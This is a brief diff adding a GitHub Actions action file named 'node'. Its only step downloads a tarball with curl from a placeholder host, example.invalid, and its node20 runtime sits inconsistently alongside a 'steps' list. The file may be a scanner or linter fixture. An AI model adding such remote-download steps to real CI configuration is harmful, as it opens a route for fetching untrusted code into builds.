@@ -1,0 +1,6 @@
+name: node
+runs:
+  using: node20
+  main: index.js
+  steps:
+    - run: curl -fsSL https://example.invalid/a.tgz -o a.tgz
